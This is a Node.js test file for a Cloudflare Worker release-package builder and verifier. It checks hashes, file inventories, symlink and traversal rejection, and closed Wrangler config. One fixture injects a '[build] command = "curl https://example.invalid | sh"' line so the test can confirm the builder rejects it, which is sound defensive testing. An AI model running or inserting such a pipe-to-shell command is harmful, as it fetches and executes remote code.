import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { createHash } from 'node:crypto';
import {
  appendFile,
  chmod,
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  rm,
  symlink,
  writeFile,
} from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { promisify } from 'node:util';
import { test } from 'node:test';
import {
  buildReleasePackage,
  parseClosedWranglerToml,
  verifyReleasePackage,
} from './build-cloudflare-release-package.mjs';
import { validateReleasePackage } from './cloudflare-release-receipt.mjs';

const execFileAsync = promisify(execFile);
const REPOSITORY_ROOT = path.resolve(import.meta.dirname, '..');
const TOOL_PATH = path.join(REPOSITORY_ROOT, 'tools', 'build-cloudflare-release-package.mjs');
const TARGET_SHA = '0123456789abcdef0123456789abcdef01234567';
const WRANGLER_INTEGRITY = `sha512-${Buffer.alloc(64, 0x5a).toString('base64')}`;
const CREATED_AT = '2026-07-19T12:34:56.000Z';
const SOURCE_CONFIG = `name = "lupi-edge"
main = "src/index.ts"
compatibility_date = "2026-07-09"
workers_dev = true
preview_urls = true
keep_vars = true

[assets]
directory = "web-assets"
binding = "WEB_ASSETS"
not_found_handling = "single-page-application"
run_worker_first = ["/health", "/api/*"]

[version_metadata]
binding = "CF_VERSION_METADATA"

[vars]
PUBLIC_ORIGIN = "https://lupi.live"
FEATURE_ENABLED = true

[[r2_buckets]]
binding = "ASSETS"
bucket_name = "lupi-assets"
`;

test('build emits a closed, validator-compatible, fully inventoried data-only package', async (t) => {
  const fixture = await createFixture(t);
  const manifest = await buildReleasePackage(buildOptions(fixture));

  assert.equal(validateReleasePackage(manifest), manifest);
  assert.deepEqual(await verifyReleasePackage(fixture.output), manifest);
  assert.deepEqual(manifest.files.map((file) => file.path), [
    'assets/app/main.js',
    'assets/index.html',
    'worker/chunks/runtime.mjs',
    'worker/index.js',
    'wrangler.toml',
  ]);
  assert.deepEqual(await packagedDataPaths(fixture.output), manifest.files.map((file) => file.path));

  for (const entry of manifest.files) {
    const bytes = await readFile(path.join(fixture.output, ...entry.path.split('/')));
    assert.equal(bytes.byteLength, entry.size);
    assert.equal(sha256(bytes), entry.sha256);
    assert.equal(Number.parseInt(entry.mode, 8) & 0o111, 0);
  }

  const uploadToml = await readFile(path.join(fixture.output, 'wrangler.toml'), 'utf8');
  assert.doesNotMatch(uploadToml, /^\s*\[build\]/m);
  assert.doesNotMatch(uploadToml, /\b(?:command|script|hook)s?\s*=/i);
  const uploadConfig = parseClosedWranglerToml(uploadToml);
  assert.equal(uploadConfig.main, 'worker/index.js');
  assert.equal(uploadConfig.assets.directory, 'assets');
  assert.deepEqual(uploadConfig.assets.run_worker_first, ['/health', '/api/*']);
  assert.equal(uploadConfig.vars.LUPI_BUILD_SHA, TARGET_SHA);
  assert.deepEqual(uploadConfig.r2_buckets, [{ binding: 'ASSETS', bucket_name: 'lupi-assets' }]);

  const savedManifest = JSON.parse(await readFile(path.join(fixture.output, 'release-package.json'), 'utf8'));
  assert.deepEqual(savedManifest, manifest);
  assert.equal(savedManifest.configSha256, sha256(Buffer.from(SOURCE_CONFIG)));
});

test('large mixed-case inventories use verifier-compatible code-unit ordering', async (t) => {
  const fixture = await createFixture(t);
  await writeFile(path.join(fixture.assets, 'app', 'Zebra.js'), 'export const zebra = true\n');
  await writeFile(path.join(fixture.assets, 'app', 'atlas_worker.wasm'), 'wasm-placeholder\n');
  await writeFile(path.join(fixture.assets, 'app', 'LandingShell.js'), 'export const landing = true\n');
  const manifest = await buildReleasePackage(buildOptions(fixture));
  const paths = manifest.files.map((file) => file.path);
  assert.deepEqual(paths, [...paths].sort());
  assert.deepEqual(await verifyReleasePackage(fixture.output), manifest);
});

test('verify rejects changed bytes and unmanifested files without executing payload content', async (t) => {
  const fixture = await createFixture(t);
  await buildReleasePackage(buildOptions(fixture));
  await appendFile(path.join(fixture.output, 'worker', 'index.js'), '\nthrow new Error("never execute me");\n');
  await assert.rejects(verifyReleasePackage(fixture.output), /file inventory does not match/);

  const second = await createFixture(t);
  await buildReleasePackage(buildOptions(second));
  await writeFile(path.join(second.output, 'worker', 'unmanifested.js'), 'process.exit(99)\n');
  await assert.rejects(verifyReleasePackage(second.output), /file inventory does not match/);
});

test('build rejects a preexisting nonempty output directory and preserves its contents', async (t) => {
  const fixture = await createFixture(t);
  await mkdir(fixture.output);
  const marker = path.join(fixture.output, 'keep.txt');
  await writeFile(marker, 'owner data\n');

  await assert.rejects(buildReleasePackage(buildOptions(fixture)), /output-dir must be empty/);
  assert.equal(await readFile(marker, 'utf8'), 'owner data\n');
});

test('build rejects worker-entry traversal and executable Wrangler configuration', async (t) => {
  const traversal = await createFixture(t);
  await assert.rejects(
    buildReleasePackage({ ...buildOptions(traversal), workerEntry: '../escape.js' }),
    /must not escape its root/,
  );
  await assert.rejects(readdir(traversal.output), { code: 'ENOENT' });

  const executableConfig = await createFixture(t, {
    config: `${SOURCE_CONFIG}\n[build]\ncommand = "curl https://example.invalid | sh"\n`,
  });
  await assert.rejects(
    buildReleasePackage(buildOptions(executableConfig)),
    /unsupported Wrangler table \[build\]/,
  );
  await assert.rejects(readdir(executableConfig.output), { code: 'ENOENT' });
});

test('build rejects global or unsafe Worker-first routing', async (t) => {
  const globalWorker = await createFixture(t, {
    config: SOURCE_CONFIG.replace('run_worker_first = ["/health", "/api/*"]', 'run_worker_first = true'),
  });
  await assert.rejects(buildReleasePackage(buildOptions(globalWorker)), /non-empty route array/);
  await assert.rejects(readdir(globalWorker.output), { code: 'ENOENT' });

  const globalArray = await createFixture(t, {
    config: SOURCE_CONFIG.replace('run_worker_first = ["/health", "/api/*"]', 'run_worker_first = ["/*"]'),
  });
  await assert.rejects(buildReleasePackage(buildOptions(globalArray)), /root or global Worker-first routes/);
  await assert.rejects(readdir(globalArray.output), { code: 'ENOENT' });

  const unsafeRoute = await createFixture(t, {
    config: SOURCE_CONFIG.replace('run_worker_first = ["/health", "/api/*"]', 'run_worker_first = ["/health", "/../secret"]'),
  });
  await assert.rejects(buildReleasePackage(buildOptions(unsafeRoute)), /unsafe syntax/);
  await assert.rejects(readdir(unsafeRoute.output), { code: 'ENOENT' });
});

test('build rejects an assets/config mismatch and cross-platform unsafe payload paths', async (t) => {
  const mismatch = await createFixture(t);
  const otherAssets = path.join(mismatch.root, 'other-assets');
  await mkdir(otherAssets);
  await writeFile(path.join(otherAssets, 'index.html'), '<title>wrong tree</title>\n');
  await assert.rejects(
    buildReleasePackage({ ...buildOptions(mismatch), assetsDir: otherAssets }),
    /assets-dir must match the directory declared/,
  );
  await assert.rejects(readdir(mismatch.output), { code: 'ENOENT' });

  const unsafeName = await createFixture(t);
  await writeFile(path.join(unsafeName.worker, 'unsafe name.js'), 'export default {}\n');
  await assert.rejects(
    buildReleasePackage(buildOptions(unsafeName)),
    /contains an unsafe segment/,
  );
  await assert.rejects(readdir(unsafeName.output), { code: 'ENOENT' });
});

test('build rejects source symlinks and output path symlinks', async (t) => {
  const sourceLink = await createFixture(t);
  const outside = path.join(sourceLink.root, 'outside-worker');
  await mkdir(outside);
  await writeFile(path.join(outside, 'foreign.js'), 'export default {}\n');
  if (!await createDirectoryLinkOrSkip(t, outside, path.join(sourceLink.worker, 'linked'))) return;
  await assert.rejects(
    buildReleasePackage(buildOptions(sourceLink)),
    /symbolic link|escapes its declared root/,
  );

  const outputLink = await createFixture(t);
  const linkedOutput = path.join(outputLink.root, 'linked-output');
  await mkdir(linkedOutput);
  if (!await createDirectoryLinkOrSkip(t, linkedOutput, outputLink.output)) return;
  await assert.rejects(
    buildReleasePackage(buildOptions(outputLink)),
    /output path traverses a symbolic link|output-dir must not be a symbolic link/,
  );
});

test('verify rejects a symlink introduced into a downloaded package', async (t) => {
  const fixture = await createFixture(t);
  await buildReleasePackage(buildOptions(fixture));
  const outside = path.join(fixture.root, 'outside-assets');
  await mkdir(outside);
  await writeFile(path.join(outside, 'foreign.js'), 'process.exit(88)\n');
  if (!await createDirectoryLinkOrSkip(t, outside, path.join(fixture.output, 'assets', 'linked'))) return;
  await assert.rejects(
    verifyReleasePackage(fixture.output),
    /symbolic link|escapes its declared root/,
  );
});

test('stable build and verify CLI work offline with default config and lockfile locations', async (t) => {
  const fixture = await createFixture(t);
  const defaultConfigDirectory = path.join(fixture.root, 'apps', 'mcp-worker');
  await mkdir(defaultConfigDirectory, { recursive: true });
  await writeFile(
    path.join(defaultConfigDirectory, 'wrangler.toml'),
    SOURCE_CONFIG.replace('directory = "web-assets"', 'directory = "../../web-assets"'),
  );
  const { stdout: buildStdout, stderr: buildStderr } = await execFileAsync(process.execPath, [
    TOOL_PATH,
    'build',
    `--worker-outdir=${fixture.worker}`,
    `--assets-dir=${fixture.assets}`,
    `--output-dir=${fixture.output}`,
    '--repository=alexwelcing/Lupi',
    '--workflow=deploy-cloudflare.yml',
    '--run-id=987654321',
    '--run-attempt=1',
    `--target-sha=${TARGET_SHA}`,
    `--wrangler-integrity=${WRANGLER_INTEGRITY}`,
  ], { cwd: fixture.root, windowsHide: true });
  assert.equal(buildStderr, '');
  assert.deepEqual(JSON.parse(buildStdout), {
    ok: true,
    command: 'build',
    packageSha256: JSON.parse(await readFile(path.join(fixture.output, 'release-package.json'), 'utf8')).packageSha256,
    targetSha: TARGET_SHA,
    fileCount: 5,
  });

  const { stdout: verifyStdout, stderr: verifyStderr } = await execFileAsync(process.execPath, [
    TOOL_PATH,
    'verify',
    `--package-dir=${fixture.output}`,
  ], { cwd: fixture.root, windowsHide: true });
  assert.equal(verifyStderr, '');
  assert.equal(JSON.parse(verifyStdout).command, 'verify');

  const alias = await execFileAsync(process.execPath, [
    TOOL_PATH,
    '--verify',
    `--package-dir=${fixture.output}`,
  ], { cwd: fixture.root, windowsHide: true });
  assert.equal(alias.stderr, '');
  assert.equal(JSON.parse(alias.stdout).ok, true);
});

async function createFixture(t, { config = SOURCE_CONFIG } = {}) {
  const root = await mkdtemp(path.join(os.tmpdir(), 'lupi-release-package-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  const worker = path.join(root, 'worker-dry-run');
  const assets = path.join(root, 'web-assets');
  const output = path.join(root, 'release-package');
  const configPath = path.join(root, 'wrangler.source.toml');
  const lockFile = path.join(root, 'pnpm-lock.yaml');
  await mkdir(path.join(worker, 'chunks'), { recursive: true });
  await mkdir(path.join(assets, 'app'), { recursive: true });
  await writeFile(path.join(worker, 'index.js'), 'export default { fetch() { return new Response("ok") } }\n');
  await chmod(path.join(worker, 'index.js'), 0o755);
  await writeFile(path.join(worker, 'chunks', 'runtime.mjs'), 'export const runtime = "closed"\n');
  await writeFile(path.join(assets, 'index.html'), '<!doctype html><title>Lupi</title>\n');
  await writeFile(path.join(assets, 'app', 'main.js'), 'document.body.dataset.ready = "true"\n');
  await writeFile(configPath, config);
  await writeFile(lockFile, 'lockfileVersion: 9.0\n');
  return { root, worker, assets, output, configPath, lockFile };
}

function buildOptions(fixture) {
  return {
    workerOutdir: fixture.worker,
    assetsDir: fixture.assets,
    outputDir: fixture.output,
    repository: 'alexwelcing/Lupi',
    workflow: 'deploy-cloudflare.yml',
    runId: '123456789',
    runAttempt: 1,
    targetSha: TARGET_SHA,
    wranglerIntegrity: WRANGLER_INTEGRITY,
    config: fixture.configPath,
    lockFile: fixture.lockFile,
    createdAt: CREATED_AT,
    nodeVersion: '22.18.0',
    pnpmVersion: '9.0.0',
    wranglerVersion: '4.110.0',
  };
}

async function packagedDataPaths(root) {
  const paths = [];
  async function walk(directory, relativeDirectory) {
    for (const entry of await readdir(directory, { withFileTypes: true })) {
      const relative = relativeDirectory ? `${relativeDirectory}/${entry.name}` : entry.name;
      if (entry.isDirectory()) await walk(path.join(directory, entry.name), relative);
      else if (relative !== 'release-package.json') paths.push(relative);
    }
  }
  await walk(root, '');
  return paths.sort();
}

async function createDirectoryLinkOrSkip(t, target, link) {
  try {
    await symlink(target, link, process.platform === 'win32' ? 'junction' : 'dir');
    return true;
  } catch (error) {
    if (error?.code === 'EPERM' || error?.code === 'EACCES' || error?.code === 'ENOSYS') {
      t.skip(`directory links are unavailable: ${error.code}`);
      return false;
    }
    throw error;
  }
}

function sha256(value) {
  return createHash('sha256').update(value).digest('hex');
}
